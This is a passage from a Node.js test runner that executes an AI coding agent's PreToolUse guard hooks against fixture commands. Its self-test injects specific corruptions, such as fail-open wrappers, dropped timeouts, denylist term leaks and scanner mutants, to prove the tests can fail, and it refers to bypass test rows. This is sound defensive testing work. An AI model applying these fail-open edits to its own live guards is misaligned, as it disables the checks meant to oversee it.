  if (loaded.problems.length) return { guardProblems: loaded.problems.length, failures: [], rows: 0 };

  let failures = [];
  let rows = 0;
  for (const g of GUARDS) {
    const mine = ROWS.filter((r) => r.guard === g.key);
    say("");
    say("[2." + (GUARDS.indexOf(g) + 1) + "] " + g.label + " - " + mine.length + " rows");
    const f = runRows(mine, loaded.guards, ctx);
    say("      " + g.key + ": " + mine.length + " rows, " + f.length + " failed");
    failures = failures.concat(f);
    rows += mine.length;
  }
  say("");
  say("[2.x] gh-publish denylist AUDIT mode (denylist-scan.js --audit, against the audit stub) - " + AUDIT_ROWS.length + " rows");
  const af = runAuditRows(ctx);
  say("      audit: " + AUDIT_ROWS.length + " rows, " + af.length + " failed");
  failures = failures.concat(af);
  rows += AUDIT_ROWS.length;
  return { guardProblems: 0, failures: failures, rows: rows };
}

// ---------------------------------------------------------------------------------------------
// [7] The self-test - the runner proving it can FAIL
// ---------------------------------------------------------------------------------------------
// Runs on EVERY normal run, not only behind its flag. The flag exists to run it alone while working
// on the runner; it is deliberately not the only way to reach it, because an obligation that fires
// only when somebody remembers it goes unexercised - and a control nobody exercised is
// indistinguishable from one that cannot fail.
//
// Each scenario writes a CORRUPTED COPY of the affected guard's SOURCE file (settings.json, or
// the shipped hooks.json) to a temp file and scores that guard's rows through the same on-disk
// load path - the committed files are never touched. Two directions, because a matrix can be blind in
// either: a guard that silently allows everything (the silent-allow shape) is caught only by DENY rows, and
// a guard that denies everything only by ALLOW rows.

// Replace the LAST `exit 2` of a gh-scan saved command (the block of its fallback) with `repl`.
const lastExit2 = (cmd, repl) => { const i = cmd.lastIndexOf("exit 2"); return i < 0 ? cmd : cmd.slice(0, i) + repl + cmd.slice(i + 6); };

const CORRUPTIONS = [
  {
    name: "gate-verdict-neutered",
    guard: "gate-verdict",
    direction: "DENY",
    apply: (cmd) => cmd.split("validate-local").join("no-such-gate-script"),
    why: "the silent-allow shape: the guard loads, throws nothing, and allows every piped read - DENY rows must catch it",
  },
  {
    name: "commit-branch-unconditional",
    guard: "commit-branch",
    direction: "ALLOW",
    apply: (cmd) => cmd.split("branch===\"dev\"||branch===\"main\"").join("true"),
    why: "the opposite failure: the guard denies on every branch - only ALLOW rows catch it",
  },
  {
    name: "branch-delete-never-asks",
    guard: "branch-delete",
    direction: "DENY",
    apply: (cmd) => cmd.split("if(refs.length===0)").join("if(true)"),
    why: "the silent-allow shape on the shipped guard: it parses the command, finds the ref, then returns before " +
      "ever calling gh - DENY rows must catch it, and an open PR would die unmerged with nobody warned",
  },
  {
    name: "changelog-heading-blind",
    guard: "changelog-heading",
    direction: "WARN",
    apply: (cmd) => cmd.split("if(gone.length>0)").join("if(false)"),
    why: "the heading clause reads both versions of the changelog and then reports nothing while the date " +
      "echo still speaks - only the WARN rows' heading-text pins catch it, since the verdict stays WARN",
  },
  // The worktree-targeting behaviours, one corruption each. `FLAG` direction = an `after` flag-file check
  // failed: the marking hooks never change a verdict on the row that does the marking, so a
  // verdict-only self-test could not see them die.
  {
    name: "commit-branch-linked-fail-open",
    guard: "commit-branch",
    direction: "DENY",
    apply: (cmd) => cmd.split("if(w.linked){const gm").join("if(w.linked){return null;const gm"),
    why: "the fail-open restored: a linked worktree's HEAD is never read, so a commit in one checked " +
      "out at dev/main is allowed - the linked-worktree DENY rows must catch it",
  },
  {
    name: "head-freeze-ignores-isolation",
    guard: "head-freeze",
    direction: "ALLOW",
    apply: (cmd) => cmd.split("(typeof en.wc===\"string\"&&en.wc)?").join("false?"),
    why: "every agent treated as not-yet-seen, i.e. presumed in the main checkout - the linked-worktree false positive " +
      "returns, and only the ALLOW rows with an isolated agent catch it",
  },
  {
    name: "head-freeze-never-marks",
    guard: "head-freeze",
    direction: "FLAG",
    apply: (cmd) => cmd.split("en.wc=root;en.isolated=w.linked;").join(""),
    why: "the mark step runs and writes nothing new - every verdict on its own row stays right, so only " +
      "the flag-file checks catch it, and every isolated lane would freeze the main HEAD for its whole life",
  },
  {
    name: "agent-raise-drops-cwd",
    guard: "agent-raise",
    direction: "FLAG",
    apply: (cmd) => cmd.split("if(st.isFile()){").join("if(false){"),
    why: "SubagentStart raises the agent but never records a worktree cwd - silent by construction, so only " +
      "the flag-file check catches it",
  },
  // the echo never denies, so both scenarios stay WARN-or-ALLOW; the first is caught only by the
  // WARN rows' PR-number pins, which is why those rows carry `msg`.
  {
    name: "closing-echo-unbounded",
    guard: "closing-echo",
    direction: "WARN",
    apply: (cmd) => cmd.split(".split(/[;&|\\n)" + BT + "]/)[0].split(/(?:^|\\s)#/)[0]").join(""),
    why: "the unbounded search: the PR number is taken from ANY later segment, so the repro echoes PR #1 - " +
      "still a WARN, so only the rows pinning WHICH PR was fetched catch it",
  },
  {
    name: "closing-echo-no-heredoc-strip",
    guard: "closing-echo",
    direction: "ALLOW",
    apply: (cmd) => cmd.split("const cx=hd(cmd);").join("const cx=cmd;"),
    why: "a merge line inside a data heredoc is read as a command again - caught only by the " +
      "heredoc ALLOW row",
  },
  // both stay WARN (the hook still speaks, just about the wrong repo's PR), so only the rows pinning
  // the fetched repo in `msg` can see them.
  {
    name: "closing-echo-drops-gh-repo",
    guard: "closing-echo",
    direction: "WARN",
    apply: (cmd) => cmd.split("if(!rp)rp=ge;").join(""),
    why: "the broken variant: the GH_REPO env prefix is parsed and never passed on, so #<n> is fetched from " +
      "the hook cwd's repo - the env rows' repo pins catch it",
  },
  {
    name: "closing-echo-drops-pr-url",
    guard: "closing-echo",
    direction: "WARN",
    apply: (cmd) => cmd.split("url||num").join("num"),
    why: "the broken variant: a PR URL is reduced to its number and viewed in the hook cwd's repo - the URL " +
      "rows' repo pins catch it",
  },
  // still a WARN - the hook speaks, about the cwd's host - so only the rows pinning the forwarded host catch it.
  {
    name: "closing-echo-drops-gh-host",
    guard: "closing-echo",
    direction: "WARN",
    apply: (cmd) => cmd.split("{cwd:cwd,env:genv,").join("{cwd:cwd,"),
    why: "the broken variant: the GH_HOST env prefix is parsed and never forwarded, so the PR is fetched from " +
      "the hook cwd's host - the GH_HOST rows' host pins catch it",
  },
  // the earlier-export lookup is shared by both variables; one corruption per family so neither can die
  // unseen behind the other's rows, and one for the headline rule (a bare assignment is NOT exported).
  {
    name: "closing-echo-drops-earlier-gh-repo",
    guard: "closing-echo",
    direction: "WARN",
    apply: (cmd) => cmd.split("return r!==undefined?r:ee(n);").join("return r!==undefined?r:(n===\"GH_REPO\"?\"\":ee(n));"),
    why: "the broken variant for GH_REPO: only the merge's own inline prefix is read, so an earlier `export GH_REPO` " +
      "is ignored and #<n> is fetched from the hook cwd's repo - the earlier-export rows' repo pins catch it",
  },
  {
    name: "closing-echo-drops-earlier-gh-host",
    guard: "closing-echo",
    direction: "WARN",
    apply: (cmd) => cmd.split("return r!==undefined?r:ee(n);").join("return r!==undefined?r:(n===\"GH_HOST\"?\"\":ee(n));"),
    why: "the broken variant for GH_HOST: an earlier `export GH_HOST` is never forwarded, so the PR is fetched " +
      "from the hook cwd's host - the earlier-export rows' host pins catch it",
  },
  {
    name: "closing-echo-bare-assignment-exported",
    guard: "closing-echo",
    direction: "WARN",
    apply: (cmd) => cmd.split("e.v=unq(a[2]);st[a[1]]=e;").join("e.v=unq(a[2]);e.x=true;st[a[1]]=e;"),
    why: "every bare `VAR=v;` read as exported - a variable gh never sees is applied, " +
      "tagging the merge with a repo/host it will not use - the bare-assignment `absent` rows catch it",
  },
  // The gh-scan entries. The saved command ends in `timeout N node "$s" --hook || { ...; exit 2; }`; the first two
  // corruptions edit that (the LAST `exit 2` is the block), and the two LEAK ones make a block reason print a fixture term / the fixture DENYLIST_FILE path (LEAK =
  // a row's no-term / no-path assertion failed - the assertion on every gh-scan row is itself proven able to fail).
  {
    name: "gh-scan-bash-fails-open",
    guard: "gh-scan-bash",
    direction: "DENY",
    apply: (cmd) => lastExit2(cmd, "exit 0"),
    why: "the fail-open wrapper (the existing guards' `|| true`): node's exit 2 and every crash become an allow - " +
      "the DENY rows, including the missing-denylist and scanner-absent controls, must catch it",
  },
  {
    name: "gh-scan-bash-unbounded",
    guard: "gh-scan-bash",
    direction: "DENY",
    apply: (cmd) => cmd.split("timeout 6 ").join(""),
    why: "the bound removed: a scanner that hangs now hangs the hook, which the client treats as a non-blocking error " +
      "(an allow) - only the hang control row, run under the per-row limit, can see it",
  },
  {
    name: "gh-scan-bash-blocks-everything",
    guard: "gh-scan-bash",
    direction: "ALLOW",
    apply: (cmd) => cmd.split("--hook").join("--no-such-mode"),
    why: "the scanner rejects its mode and the wrapper turns that into a block on EVERY command - only the ALLOW rows catch it",
  },
  {
    name: "gh-scan-bash-leaks-term",
    guard: "gh-scan-bash",
    direction: "LEAK",
    apply: (cmd) => lastExit2(cmd, "echo " + GS_TERMS[0] + " >&2; exit 2"),
    why: "a block whose reason prints a denylist term - only the no-term assertion on the rows catches it",
  },
  {
    name: "gh-scan-bash-leaks-path",
    guard: "gh-scan-bash",
    direction: "LEAK",
    apply: (cmd) => lastExit2(cmd, "echo \"$DENYLIST_FILE\" >&2; exit 2"),
    why: "a block whose reason prints the resolved denylist path - only the no-path assertion on the rows catches it",
  },
  {
    name: "gh-scan-ps-fails-open",
    guard: "gh-scan-ps",
    direction: "DENY",
    apply: (cmd) => lastExit2(cmd, "exit 0"),
    why: "the same fail-open wrapper on the PowerShell entry - its own DENY rows must catch it",
  },
  // Scanner-LOGIC corruptions. The wrapper corruptions above leave the scanner alone, so they cannot show that a row is
  // bound to a rule INSIDE it; these run a mutated copy of scripts/denylist-scan.js (mutate = [anchor, replacement], each
  // anchor unique in the scanner) under the unchanged saved command, and the rows of that rule must fail. `pick` (a regex on
  // a row's note) keeps each mutant to the few rows that bind the rule: a mutant that ran the whole table would cost minutes.
  {
    name: "scan-file-contents-unread",
    guard: "gh-scan-bash",
    pick: /^CONTROL - a body FILE|split across a LINE BREAK|a RELATIVE body file/,
    direction: "DENY",
    mutate: ["    if (raw !== null) ctx.scans.push({ label: label + \" (file contents)\", text: raw });\n  } else if (flag.k === \"input\"",
      "    if (raw !== null) void 0;\n  } else if (flag.k === \"input\""],
    why: "a body file is read and then never scanned - every file-contents DENY row must catch it",
  },
  {
    name: "scan-inline-body-accepted",
    guard: "gh-scan-bash",
    pick: /^CONTROL - an inline body is refused|^an inline body with the term/,
    direction: "DENY",
    mutate: ["  if (flag.fileOnly) {", "  if (false) {"],
    why: "an inline --body is no longer refused - only the rows that carry a CLEAN inline body can see it",
  },
  {
    name: "scan-tier-b-publishing-allowed",
    guard: "gh-scan-bash",
    pick: /^COMPOUND - a clean publishing|^a publishing gh followed by another command/,
    direction: "DENY",
    mutate: ["if (ctx.tier === \"B\") { ctx.problems.push(\"gh \" + g + \" \" + v + \": \" + B_MSG); return; }",
      "if (ctx.tier === \"B\") { return; }"],
    why: "a publishing gh in a compound command is found and then allowed - the clean-text compound rows must catch it",
  },
  {
    name: "scan-per-line-only",
    guard: "gh-scan-bash",
    pick: /split across a LINE BREAK|split at its space/,
    direction: "DENY",
    mutate: ["  for (const v of flat) {", "  for (const v of []) {"],
    why: "matching sees one line at a time - the term-split-across-a-line-break rows must catch it",
  },
  {
    name: "scan-no-nfkc",
    guard: "gh-scan-bash",
    pick: /fullwidth letters/,
    direction: "DENY",
    mutate: [".normalize(\"NFKC\")", ".normalize(\"NFC\")"],
    why: "fullwidth letters are no longer folded - the fullwidth-term row must catch it",
  },
  {
    name: "scan-cd-ignored",
    guard: "gh-scan-bash",
    pick: /^BYPASS 13 - a cd before gh/,
    direction: "DENY",
    mutate: ["if (ctx.cd && !absolute)", "if (false)"],
    why: "a relative file after a cd is read against the hook cwd - the cd rows must catch it",
  },
  {
    name: "scan-reads-blocked",
    guard: "gh-scan-bash",
    pick: /^ritual: read a PR body|^compound read-only gh|^CONTROL - a clean RELATIVE body file/,
    direction: "ALLOW",
    mutate: ["    if (SAFE_VERBS[g].indexOf(v) >= 0) { vet(null); return; }", "    if (SAFE_VERBS[g].indexOf(v) >= 0) { ctx.problems.push(\"mutant\"); return; }"],
    why: "a recognised read-only verb is refused - only the ALLOW rows with a read can catch it",
  },
];

// A scanner-logic corruption: write the mutated scanner under the fixture dir and point the saved command's script root at it.
function mutantApply(c, ctx) {
  const src = fs.readFileSync(path.join(REPO_ROOT, "scripts", "denylist-scan.js"), "utf8");
  if (src.split(c.mutate[0]).length !== 2) return null;
  const dir = path.join(ctx.root, "mutant-" + c.name);
  fs.mkdirSync(path.join(dir, "scripts"), { recursive: true });
  fs.writeFileSync(path.join(dir, "scripts", "denylist-scan.js"), src.replace(c.mutate[0], () => c.mutate[1]));
  return (cmd) => cmd.split("${CLAUDE_PROJECT_DIR:-.}").join(fwd(dir));
}

function runSelfTest(ctx) {
  say("");
  say("[3] self-test - can this runner report FAIL?");
  const live = loadGuards(PATHS);
  if (live.problems.length) {
    fail("self-test cannot run: the guards did not resolve in " + PATHS.settings + " / " + PATHS.plugin);
    return false;
  }

  let allProved = true;
  for (const c of CORRUPTIONS) {
    const target = live.guards[c.guard];
    const copy = JSON.parse(fs.readFileSync(PATHS[target.source], "utf8"));
    let applied = 0;
    const apply = c.mutate ? mutantApply(c, ctx) : c.apply;
    if (!apply) {
      fail(c.name + ": the mutation anchor is not unique in scripts/denylist-scan.js - the scanner text moved, so this scenario proves nothing. Update its `mutate`.");
      allProved = false;
      continue;
    }
    copy.hooks[eventOf(target)].forEach((entry) => {
      (entry.hooks || []).forEach((h) => {
        if (String(h.statusMessage || "").indexOf(target.match) < 0) return;
        const corrupted = apply(String(h.command));
        // A corruption that silently did not apply would leave the guard intact and the self-test
        // would report "the runner cannot fail" - a false alarm about the wrong thing. Assert it bit.
        if (corrupted === h.command) return;
        h.command = corrupted;
        applied++;
      });
    });
    const brokenPath = path.join(ctx.root, "corrupted-" + c.name + "." + target.source + ".json");
    if (applied !== 1) {
      fail(c.name + ": the corruption did not apply (" + applied + " hook(s) changed) - the guard text " +
        "moved, so this scenario proves nothing. Update its `apply` before trusting any green above.");
      allProved = false;
      continue;
    }
    fs.writeFileSync(brokenPath, JSON.stringify(copy, null, 2));

    const broken = loadGuards(Object.assign({}, PATHS, { [target.source]: brokenPath }));
    if (broken.problems.length) {
      fail(c.name + ": the corrupted copy no longer resolves its guards - " + broken.problems[0]);
      allProved = false;
      continue;
    }
    const mine = ROWS.filter((r) => r.guard === c.guard && (!c.pick || c.pick.test(r.note)));
    if (!mine.length) {
      fail(c.name + ": its `pick` matches no row - a row note moved, so this scenario proves nothing. Update its `pick`.");
      allProved = false;
      continue;
    }
    say("  -- " + c.name + " (" + c.why + ")");
    const failures = runRows(mine, broken.guards, ctx);
    const rightDirection = failures.filter((f) =>
      (c.direction === "FLAG" ? f.flagMiss : c.direction === "LEAK" ? f.leak : f.expect === c.direction));
    if (failures.length === 0) {
      fail(c.name + ": the corrupted guard scored CLEAN - this matrix cannot detect it");
      allProved = false;
    } else if (rightDirection.length === 0) {
      fail(c.name + ": " + failures.length + " row(s) failed but none of the expected-" + c.direction +
        " kind - the rows that should discriminate did not");
      allProved = false;
    } else {
      pass(c.name + ": " + failures.length + " row(s) failed as required (" + rightDirection.length +
        " expected-" + c.direction + "), incl. " + rightDirection.slice(0, 3).map((f) => f.id).join(", "));
    }
    fs.unlinkSync(brokenPath);
  }
  return allProved;
}

// ---------------------------------------------------------------------------------------------
// [8] Main
// ---------------------------------------------------------------------------------------------
function main() {
  if (OPT.help) { usage(); return EXIT_GREEN; }
  const unknown = FLAGS.filter((f) => KNOWN_FLAGS.indexOf(f) < 0 && f.indexOf(HOOKS_FLAG) !== 0);
  if (unknown.length) { fail("unknown option(s): " + unknown.join(" ")); usage(); return EXIT_NO_VERDICT; }
  if (POSITIONAL.length > 1) { fail("expected at most one settings path"); usage(); return EXIT_NO_VERDICT; }
  if (HOOKS_ARGS.length > 1) { fail("expected at most one " + HOOKS_FLAG + "<path>"); usage(); return EXIT_NO_VERDICT; }
  if (!fs.existsSync(SETTINGS_PATH)) { fail("settings file not found: " + SETTINGS_PATH); return EXIT_NO_VERDICT; }
  if (!fs.existsSync(PLUGIN_HOOKS_PATH)) { fail("plugin hooks file not found: " + PLUGIN_HOOKS_PATH); return EXIT_NO_VERDICT; }

  say("guard-matrix - executing the shipped PreToolUse guard strings, " +
    (OPT.nodeDirect ? "node-direct (DIAGNOSTIC)" : "bash -c (production path)"));
  if (OPT.nodeDirect) {
    warn("--node-direct is NOT the control. It bypasses the bash -> node.exe hand-off that can let a");
    warn("      guard ship dead, so its rows can be green while the shipped guard is broken.");
    warn("      This run always exits " + EXIT_DIAGNOSTIC + " and must never be quoted as verification.");
  }

  let ctx = null;
  let exitCode = EXIT_GREEN;
  try {
    const tmp = probeHookTmpdir();
    const built = buildFixtures();
    ctx = {
      root: built.root, repos: built.repos, ghStub: buildGhStub(built.root),
      flagFile: path.join(tmp, "fluyt-live-agents-" + SID + ".json"),
    };
    say("  fixtures: " + ctx.root + "  (dev, main, feature, worktree, wtdev, wtmain, changelog)");
    say("  gh stub: " + path.basename(ctx.ghStub.bin) + " (a node.exe copy named gh, driven by GUARD_MATRIX_GH)");
    say("  hook tmpdir: " + tmp + "  flag file: " + path.basename(ctx.flagFile) + " (fake session id)");
    say("");

    let result = { guardProblems: 0, failures: [], rows: 0 };
    if (!OPT.selfTestOnly) result = runMatrix(ctx);
    const proved = runSelfTest(ctx);

    say("");
    say("-----------------------------------------------------------------");
    const failIds = result.failures.map((f) => f.id);
    // Precedence: an actual mismatch outranks an unproven self-test, because it is the more
    // actionable signal and both exit non-zero anyway. The unproven case gets its own exit code only
    // when everything else is GREEN - that is the dangerous combination (a clean-looking run whose
    // cleanliness is unverified).
    if (!proved && (failIds.length > 0 || result.guardProblems > 0)) {
      warn("the self-test did not prove failability on this settings file - see [3]; the RED below");
      warn("      stands on its own, but re-check [3] before trusting a later GREEN.");
    }
    if (!proved && failIds.length === 0 && result.guardProblems === 0) {
      say("RESULT: NO VERDICT - the self-test could not make this runner report FAIL.");
      say("        A control that cannot fail is the defect this runner exists to prevent. Every");
      say("        PASS above is unproven until [3] is green again.");
      exitCode = EXIT_NO_VERDICT;
    } else if (result.guardProblems > 0) {
      say("RESULT: RED - " + result.guardProblems + " guard identity problem(s); see the FAIL lines in [1].");
      exitCode = EXIT_RED;
    } else if (failIds.length > 0) {
      say("RESULT: RED - " + failIds.length + "/" + result.rows + " row(s) mismatched: " + failIds.join(", "));
      say("        Each FAIL line above carries the note saying what has to be wrong for it to fail.");
      exitCode = EXIT_RED;
    } else if (OPT.selfTestOnly) {
      say("RESULT: GREEN - self-test only: the runner demonstrably reports FAIL on a corrupted guard.");
      say("        The real matrix was NOT run - this is not a verdict on " + SETTINGS_PATH + " or " +
        PLUGIN_HOOKS_PATH + ".");
    } else {
      const bySource = (s) => GUARDS.filter((g) => g.source === s && eventOf(g) === "PreToolUse").length;
      const others = GUARDS.filter((g) => eventOf(g) !== "PreToolUse").map((g) => eventOf(g) + " " + g.key);
      say("RESULT: GREEN - " + result.rows + "/" + result.rows + " rows as expected across " +
        (bySource("settings") + bySource("plugin")) + " PreToolUse guards (" + bySource("settings") +
        " repo-local + " + bySource("plugin") + " shipped)" + (others.length ? " + " + others.join(", ") : "") +
        ", and the self-test proved the runner can report FAIL.");
    }
    if (OPT.nodeDirect) {
      say("");
      say("        DIAGNOSTIC RUN - verdict above is informational only; exiting " + EXIT_DIAGNOSTIC + ".");
      exitCode = EXIT_DIAGNOSTIC;
    }
  } catch (e) {
    say("");
    fail("the runner could not produce a verdict: " + e.message);
    exitCode = EXIT_NO_VERDICT;
  } finally {
    // Torn down on the failure path too - a leftover fixture repo would be scored by the next run's
    // mkdtemp neighbours and a leftover flag file would deny a real HEAD move under a fake session.
    if (ctx) {
      setFlag(ctx.flagFile, "none");
      tearDown(ctx.root);
    }
  }
  return exitCode;
}

process.exit(main());
